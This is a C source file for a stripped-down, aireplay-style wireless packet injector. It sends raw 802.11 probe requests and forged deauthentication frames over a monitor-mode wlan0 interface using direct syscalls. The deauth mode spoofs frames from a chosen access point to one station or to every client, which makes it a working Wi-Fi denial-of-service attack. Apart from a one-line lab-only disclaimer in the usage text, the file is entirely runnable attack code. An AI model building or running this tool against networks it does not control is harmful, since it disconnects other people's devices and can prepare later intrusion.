typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;

extern int sys_write(int fd, const void *buffer, unsigned int count);
extern int sys_ioctl(int fd, unsigned int request, void *argument);
extern int sys_socket(int domain, int type, int protocol);
extern int sys_bind(int fd, const void *address, unsigned int length);
extern int sys_sendto(int fd, const void *buffer, unsigned int length, unsigned int flags, const void *address, unsigned int address_length);
extern int sys_close(int fd);
extern void sys_exit(int status);

extern int sys_open(const char *path, unsigned int flags, unsigned int mode);
extern int sys_read(int fd, void *buffer, unsigned int count);

static char cmdline_buffer[256];
static char *cmdline_argv[10];

static int load_cmdline_args(char ***argv_out)
{
    int fd;
    int length;
    int argc = 0;
    int index;

    fd = sys_open("/proc/self/cmdline", 0, 0);
    if (fd < 0) {
        *argv_out = cmdline_argv;
        cmdline_argv[0] = (char *)"tool";
        return 1;
    }

    length = sys_read(fd, cmdline_buffer, sizeof(cmdline_buffer) - 1);
    sys_close(fd);
    if (length <= 0) {
        *argv_out = cmdline_argv;
        cmdline_argv[0] = (char *)"tool";
        return 1;
    }

    cmdline_buffer[length] = 0;
    if (cmdline_buffer[length - 1] != 0 && length + 1 < (int)sizeof(cmdline_buffer))
        cmdline_buffer[length++] = 0;

    if (argc < 10)
        cmdline_argv[argc++] = cmdline_buffer;
    for (index = 0; index < length - 1 && argc < 10; index++) {
        if (cmdline_buffer[index] == 0 && cmdline_buffer[index + 1] != 0)
            cmdline_argv[argc++] = cmdline_buffer + index + 1;
    }

    *argv_out = cmdline_argv;
    return argc;
}


#define AF_PACKET 17
#define SOCK_RAW 3
#define ETH_P_ALL_NETWORK_ORDER 0x0300
#define SIOCGIFINDEX 0x8933

static const u8 broadcast_mac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
static const u8 test_mac[6] = { 0x02, 0x57, 0x4e, 0x37, 0x32, 0x33 };

static void write_text(const char *text)
{
    unsigned int length = 0;

    while (text[length] != 0)
        length++;

    sys_write(1, text, length);
}

static int str_equal(const char *left, const char *right)
{
    unsigned int index = 0;

    while (left[index] != 0 && right[index] != 0) {
        if (left[index] != right[index])
            return 0;
        index++;
    }

    return left[index] == right[index];
}

static unsigned int str_len(const char *text)
{
    unsigned int length = 0;

    while (text[length] != 0)
        length++;

    return length;
}

static int parse_uint(const char *text, unsigned int *value)
{
    unsigned int result = 0;
    unsigned int index = 0;

    if (text[0] == 0)
        return -1;

    while (text[index] != 0) {
        unsigned int digit;

        if (text[index] < '0' || text[index] > '9')
            return -1;
        digit = (unsigned int)(text[index] - '0');
        if (result > 1000000U)
            return -1;
        result = result * 10U + digit;
        index++;
    }

    *value = result;
    return 0;
}

static int hex_value(char c)
{
    if (c >= '0' && c <= '9')
        return c - '0';
    if (c >= 'a' && c <= 'f')
        return c - 'a' + 10;
    if (c >= 'A' && c <= 'F')
        return c - 'A' + 10;
    return -1;
}

static int parse_mac(const char *text, u8 mac[6])
{
    unsigned int index;

    for (index = 0; index < 6; index++) {
        int high = hex_value(text[index * 3]);
        int low = hex_value(text[index * 3 + 1]);

        if (high < 0 || low < 0)
            return -1;
        mac[index] = (u8)((high << 4) | low);
        if (index != 5 && text[index * 3 + 2] != ':')
            return -1;
    }

    if (text[17] != 0)
        return -1;

    return 0;
}

static void copy_mac(u8 *destination, const u8 *source)
{
    unsigned int index;

    for (index = 0; index < 6; index++)
        destination[index] = source[index];
}

static void zero_bytes(u8 *data, unsigned int length)
{
    unsigned int index;

    for (index = 0; index < length; index++)
        data[index] = 0;
}

static void write_dec(unsigned int value)
{
    char output[10];
    unsigned int index = 0;

    if (value == 0) {
        char zero = '0';
        sys_write(1, &zero, 1);
        return;
    }

    while (value > 0 && index < sizeof(output)) {
        output[index++] = (char)('0' + (value % 10));
        value /= 10;
    }

    while (index > 0) {
        index--;
        sys_write(1, &output[index], 1);
    }
}

static void usage(void)
{
    write_text("Usage:\n");
    write_text("  aireplay test [count]\n");
    write_text("  aireplay probe [count] [ssid]\n");
    write_text("  aireplay deauth <count> <bssid> [station]\n");
    write_text("  aireplay -0 <count> <bssid> [station]\n");
    write_text("\n");
    write_text("Interface is fixed to wlan0 monitor/radiotap. Use only on your own lab/AP.\n");
}

static int get_interface_index(int fd)
{
    u8 request[40];
    int index;

    zero_bytes(request, sizeof(request));
    request[0] = 'w';
    request[1] = 'l';
    request[2] = 'a';
    request[3] = 'n';
    request[4] = '0';

    if (sys_ioctl(fd, SIOCGIFINDEX, request) < 0)
        return -1;

    index = *(int *)(request + 16);
    return index;
}

static void build_sockaddr(u8 *address, int interface_index)
{
    zero_bytes(address, 20);
    address[0] = AF_PACKET;
    address[1] = 0;
    address[2] = 0;
    address[3] = 3;
    *(int *)(address + 4) = interface_index;
}

static int bind_interface(int fd, int interface_index)
{
    u8 address[20];

    build_sockaddr(address, interface_index);
    return sys_bind(fd, address, sizeof(address));
}

static int open_packet_socket(int *fd_out, int *ifindex_out)
{
    int fd;
    int interface_index;

    fd = sys_socket(AF_PACKET, SOCK_RAW, ETH_P_ALL_NETWORK_ORDER);
    if (fd < 0) {
        write_text("SOCKET_ERROR\n");
        return 10;
    }

    interface_index = get_interface_index(fd);
    if (interface_index < 0) {
        write_text("IFINDEX_ERROR\n");
        sys_close(fd);
        return 11;
    }

    if (bind_interface(fd, interface_index) < 0) {
        write_text("BIND_ERROR\n");
        sys_close(fd);
        return 12;
    }

    *fd_out = fd;
    *ifindex_out = interface_index;
    return 0;
}

static unsigned int append_radiotap(u8 *frame)
{
    frame[0] = 0x00;
    frame[1] = 0x00;
    frame[2] = 0x08;
    frame[3] = 0x00;
    frame[4] = 0x00;
    frame[5] = 0x00;
    frame[6] = 0x00;
    frame[7] = 0x00;
    return 8;
}

static unsigned int build_probe(u8 *frame, unsigned int sequence, const char *ssid)
{
    unsigned int offset = append_radiotap(frame);
    unsigned int ssid_length = ssid ? str_len(ssid) : 0;
    unsigned int index;

    if (ssid_length > 32)
        ssid_length = 32;

    frame[offset++] = 0x40;
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;
    copy_mac(frame + offset, broadcast_mac);
    offset += 6;
    copy_mac(frame + offset, test_mac);
    offset += 6;
    copy_mac(frame + offset, broadcast_mac);
    offset += 6;
    frame[offset++] = (u8)((sequence << 4) & 0xf0);
    frame[offset++] = (u8)((sequence >> 4) & 0xff);

    frame[offset++] = 0x00;
    frame[offset++] = (u8)ssid_length;
    for (index = 0; index < ssid_length; index++)
        frame[offset++] = (u8)ssid[index];

    frame[offset++] = 0x01;
    frame[offset++] = 0x08;
    frame[offset++] = 0x82;
    frame[offset++] = 0x84;
    frame[offset++] = 0x8b;
    frame[offset++] = 0x96;
    frame[offset++] = 0x0c;
    frame[offset++] = 0x12;
    frame[offset++] = 0x18;
    frame[offset++] = 0x24;

    return offset;
}

static unsigned int build_deauth(u8 *frame, unsigned int sequence, const u8 bssid[6], const u8 station[6])
{
    unsigned int offset = append_radiotap(frame);

    frame[offset++] = 0xc0;
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;
    copy_mac(frame + offset, station);
    offset += 6;
    copy_mac(frame + offset, bssid);
    offset += 6;
    copy_mac(frame + offset, bssid);
    offset += 6;
    frame[offset++] = (u8)((sequence << 4) & 0xf0);
    frame[offset++] = (u8)((sequence >> 4) & 0xff);
    frame[offset++] = 0x07;
    frame[offset++] = 0x00;

    return offset;
}

static int send_frames(unsigned int mode, unsigned int count, const u8 *bssid, const u8 *station, const char *ssid)
{
    static u8 frame[256];
    u8 address[20];
    int fd;
    int interface_index;
    unsigned int sent = 0;
    unsigned int index;
    int status;

    if (count == 0)
        count = 1;
    if (count > 128)
        count = 128;

    status = open_packet_socket(&fd, &interface_index);
    if (status != 0)
        return status;

    build_sockaddr(address, interface_index);

    for (index = 0; index < count; index++) {
        unsigned int length;
        int ret;

        if (mode == 1)
            length = build_deauth(frame, index, bssid, station);
        else
            length = build_probe(frame, index, ssid);

        ret = sys_sendto(fd, frame, length, 0, address, sizeof(address));
        if (ret < 0) {
            write_text("SEND_ERROR\n");
            sys_close(fd);
            return 13;
        }
        sent++;
    }

    sys_close(fd);
    write_text("SENT_FRAMES:");
    write_dec(sent);
    write_text("\n");
    return 0;
}

static int main_program(int argc, char **argv)
{
    unsigned int count = 1;
    u8 bssid[6];
    u8 station[6];

    if (argc < 2) {
        usage();
        return 1;
    }

    if (str_equal(argv[1], "test")) {
        if (argc >= 3 && parse_uint(argv[2], &count) != 0) {
            usage();
            return 1;
        }
        return send_frames(0, count, 0, 0, 0);
    }

    if (str_equal(argv[1], "probe")) {
        const char *ssid = 0;

        if (argc >= 3 && parse_uint(argv[2], &count) != 0) {
            usage();
            return 1;
        }
        if (argc >= 4)
            ssid = argv[3];
        return send_frames(0, count, 0, 0, ssid);
    }

    if (str_equal(argv[1], "deauth") || str_equal(argv[1], "-0")) {
        if (argc < 4) {
            usage();
            return 1;
        }
        if (parse_uint(argv[2], &count) != 0 || parse_mac(argv[3], bssid) != 0) {
            usage();
            return 1;
        }
        if (argc >= 5) {
            if (parse_mac(argv[4], station) != 0) {
                usage();
                return 1;
            }
        } else {
            copy_mac(station, broadcast_mac);
        }
        return send_frames(1, count, bssid, station, 0);
    }

    usage();
    return 1;
}

void _start(void)
{
    int argc;
    char **argv;
    int status;

    argc = load_cmdline_args(&argv);
    status = main_program(argc, argv);
    sys_exit(status);

    for (;;)
        ;
}
